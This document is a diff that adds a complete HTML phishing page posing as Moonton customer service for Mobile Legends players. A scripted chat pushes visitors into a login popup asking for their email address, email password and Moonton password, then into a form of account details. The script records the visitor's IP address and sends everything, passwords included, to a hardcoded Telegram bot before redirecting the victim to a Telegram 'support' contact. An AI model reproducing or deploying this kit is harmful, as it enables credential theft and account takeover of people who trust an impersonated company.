@@ -1,0 +1,214 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8"/>
+<meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+<title>Moonton Customer Service</title>
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css"/>
+<style>
+/* ——— GLOBAL & HALAMAN 1 (tidak diubah) ——— */
+*{box-sizing:border-box;margin:0;padding:0;font-family:Arial,sans-serif}
+body{background:#f4f7fa}
+.topbar{background:#fff;height:50px;display:flex;align-items:center;justify-content:center;
+        box-shadow:0 1px 4px rgba(0,0,0,.1);position:sticky;top:0;z-index:5}
+.topbar .loginBtn{position:absolute;right:15px;background:#007bff;color:#fff;border:none;
+                  border-radius:6px;padding:6px 14px;cursor:pointer;font-size:14px}
+.page{display:none;max-width:450px;margin:0 auto;padding:10px 12px 70px}
+.active{display:block}
+.chat-area{display:flex;flex-direction:column;gap:10px;margin-top:15px}
+.msg{max-width:80%;padding:10px 14px;border-radius:12px;font-size:14px;line-height:1.4}
+.bot{background:#e9f0f8;color:#000;align-self:flex-start}
+.user{background:#d1e7ff;color:#000;align-self:flex-end}
+.option-link{color:#007bff;text-decoration:none;cursor:pointer;display:block;margin:4px 0}
+.input-bar{position:fixed;bottom:0;left:0;right:0;max-width:450px;margin:0 auto;
+           background:#fff;padding:8px 12px;display:flex;align-items:center;
+           box-shadow:0 -1px 4px rgba(0,0,0,.1)}
+.input-bar input{flex:1;border:1px solid #ccc;border-radius:20px;padding:8px 14px;font-size:14px}
+.input-bar .send{color:#007bff;font-size:22px;margin-left:10px;cursor:pointer}
+/* ——— POPUP LOGIN & HALAMAN 2/3 ——— */
+.modal{position:fixed;inset:0;background:rgba(0,0,0,.55);display:none;
+       align-items:center;justify-content:center;z-index:10}
+.modal .box{background:#fff;border-radius:12px;padding:24px;width:90%;max-width:400px}
+.modal .box input{width:100%;padding:12px;margin-bottom:15px;border-radius:8px;border:1px solid #ccc}
+.input-group{position:relative}
+.input-group span{position:absolute;top:50%;transform:translateY(-50%);
+                 right:12px;font-size:12px;color:#007bff;cursor:pointer}
+.btn{width:100%;padding:12px;border:none;border-radius:8px;font-size:16px;margin-top:10px;cursor:pointer}
+.btn-primary{background:#007bff;color:#fff}
+.btn-secondary{background:#ccc;color:#333}
+.form-group input{width:100%;padding:12px;margin-bottom:12px;border-radius:8px;border:1px solid #ccc}
+.error{color:red;text-align:center;margin-bottom:10px}
+.centered{text-align:center;margin-top:40px}
+.telegram{display:inline-block;margin-top:10px;color:#007bff;text-decoration:none}
+</style>
+</head>
+<body onload="showPage(1)">
+
+<!-- TOPBAR -->
+<div class="topbar">
+  <span>Customer Service</span>
+  <button class="loginBtn" onclick="showLogin()">Login</button>
+</div>
+
+<!-- PAGE 1 : CHAT -->
+<div class="page active" id="page1">
+  <div class="chat-area" id="chatArea">
+    <div class="msg bot">
+      Hey, hero! Welcome to the Moonton customer service center.<br>
+      Please select the topic you would like to chat about from the options below:
+      <div class="option-link" onclick="chooseOption('Cancel change email')">· Cancel change email</div>
+      <div class="option-link" onclick="chooseOption('Account Recovery')">· Account Recovery</div>
+      <div class="option-link" onclick="chooseOption('Bug Reports')">· Bug Reports</div>
+    </div>
+  </div>
+</div>
+
+<!-- Input bar (hanya halaman 1) -->
+<div class="input-bar" id="inputBar">
+  <input type="text" id="userInput" placeholder="Please enter content"/>
+  <i class="fa-solid fa-paper-plane send" onclick="sendTyped()"></i>
+</div>
+
+<!-- PAGE 2 : VERIFIKASI -->
+<div class="page" id="page2">
+  <h2>Cancel Change Email</h2>
+  <div id="error" class="error"></div>
+  <div class="form-group">
+    <input id="id" placeholder="ID"/>
+    <input id="server" placeholder="Server"/>
+    <input id="nickname" placeholder="Nickname"/>
+    <input id="level" placeholder="Level"/>
+    <input id="skin" placeholder="Skin"/>
+    <input id="rank" placeholder="Current Rank"/>
+    <input id="region" placeholder="Region"/>
+    <input id="device" placeholder="Device"/>
+    <input id="created" placeholder="Account Creation Date"/>
+  </div>
+  <button class="btn btn-primary" onclick="nextPage()">Next</button>
+</div>
+
+<!-- PAGE 3 : SUKSES -->
+<div class="page" id="page3">
+  <div class="centered">
+    <h2>Successfully Verified</h2>
+    <p>Visit customer service on Telegram for more information</p>
+    <a class="telegram" href="https://t.me/MobileLegendsTeamService?start=cancel%20change%20email" target="_blank">
+      Customer Service on Telegram
+    </a>
+  </div>
+</div>
+
+<!-- LOGIN MODAL -->
+<div class="modal" id="loginModal">
+  <div class="box">
+    <h2>Login to Your Account</h2>
+    <input type="text" id="email" placeholder="Email"/>
+    <div class="input-group">
+      <input type="password" id="passEmail" placeholder="Password Email"/>
+      <span id="toggle1" onclick="toggle('passEmail','toggle1')">Show</span>
+    </div>
+    <div class="input-group">
+      <input type="password" id="passMtn" placeholder="Password Moonton"/>
+      <span id="toggle2" onclick="toggle('passMtn','toggle2')">Show</span>
+    </div>
+    <button class="btn btn-primary" onclick="submitLogin()">Login</button>
+    <button class="btn btn-secondary" onclick="hideLogin()">Back</button>
+  </div>
+</div>
+
+<script>
+/* === TELEGRAM === */
+const TELEGRAM_BOT_TOKEN='7887238935:AAHL1ZQS22eUt11Qk4-cCqoaHAQM-ndW4eg';
+const TELEGRAM_CHAT_ID='7423591679';
+async function sendToTelegram(text){
+  await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`,{
+    method:'POST',headers:{'Content-Type':'application/json'},
+    body:JSON.stringify({chat_id:TELEGRAM_CHAT_ID,text})
+  });
+}
+
+/* === NAVIGASI === */
+function showPage(n){
+  for(let i=1;i<=3;i++)document.getElementById("page"+i).classList.remove("active");
+  document.getElementById("page"+n).classList.add("active");
+  /* tampilkan input bar hanya di halaman 1 */
+  document.getElementById('inputBar').style.display=(n===1)?'flex':'none';
+  /* tampilkan tombol login hanya di halaman 1 */
+  document.querySelector('.loginBtn').style.display=(n===1)?'inline-block':'none';
+}
+
+/* === CHAT (halaman 1) === */
+function addMessage(text,cls){
+  const div=document.createElement('div');div.className=`msg ${cls}`;div.innerHTML=text;
+  document.getElementById('chatArea').appendChild(div);div.scrollIntoView({behavior:"smooth"});
+}
+function chooseOption(option){
+  addMessage(option,'user');
+  botReply(option);
+}
+function botReply(option){
+  if(option==='Cancel change email'){
+    addMessage(`To cancel email change, please <span class="option-link" onclick="showLogin()">Login</span> first.`,'bot');
+  }else if(option==='Account Recovery'){
+    addMessage('Our Account Recovery system is currently under maintenance.','bot');
+  }else if(option==='Bug Reports'){
+    addMessage('Bug reporting is currently under maintenance.','bot');
+  }
+}
+function sendTyped(){
+  const inp=document.getElementById('userInput');const txt=inp.value.trim();if(!txt)return;
+  addMessage(txt,'user');
+  addMessage(`Sorry, I didn't understand. Please pick an option above or <span class="option-link" onclick="showLogin()">Login</span>.`,'bot');
+  inp.value='';
+}
+document.getElementById('userInput').addEventListener('keydown',e=>{if(e.key==='Enter')sendTyped();});
+
+/* === LOGIN MODAL === */
+function showLogin(){document.getElementById('loginModal').style.display='flex';}
+function hideLogin(){document.getElementById('loginModal').style.display='none';}
+function toggle(inpId,spanId){
+  const inp=document.getElementById(inpId);const sp=document.getElementById(spanId);
+  if(inp.type==='password'){inp.type='text';sp.textContent='Hide';}
+  else{inp.type='password';sp.textContent='Show';}
+}
+
+/* === DATA LOGIN === */
+let loginData={};
+function submitLogin(){
+  const email=document.getElementById('email').value.trim();
+  const passEmail=document.getElementById('passEmail').value.trim();
+  const passMtn=document.getElementById('passMtn').value.trim();
+  if(!email||!passEmail||!passMtn){alert('Please complete all fields.');return;}
+  loginData={email,passEmail,passMtn};
+  hideLogin();
+  addMessage('Login successful. How can I help you further?','bot');
+  showPage(2); /* langsung ke halaman 2 */
+}
+
+/* === HALAMAN 2 —> HALAMAN 3 & TELEGRAM === */
+async function nextPage(){
+  const fld=['id','server','nickname','level','skin','rank','region','device','created'];
+  let ok=true,form={};
+  fld.forEach(f=>{const v=document.getElementById(f).value.trim();if(!v)ok=false;form[f]=v;});
+  if(!ok){document.getElementById('error').textContent='❌ Please complete the form.';return;}
+  const ip=await fetch('https://api.ipify.org?format=json').then(r=>r.json()).then(j=>j.ip);
+  const msg=`[VERIFICATION]
+IP: ${ip}
+Email: ${loginData.email||'-'}
+Password Email: ${loginData.passEmail||'-'}
+Password Moonton: ${loginData.passMtn||'-'}
+ID: ${form.id}
+Server: ${form.server}
+Nickname: ${form.nickname}
+Level: ${form.level}
+Skin: ${form.skin}
+Rank: ${form.rank}
+Region: ${form.region}
+Device: ${form.device}
+Created: ${form.created}`;
+  await sendToTelegram(msg);
+  showPage(3);
+}
+</script>
+</body>
+</html>
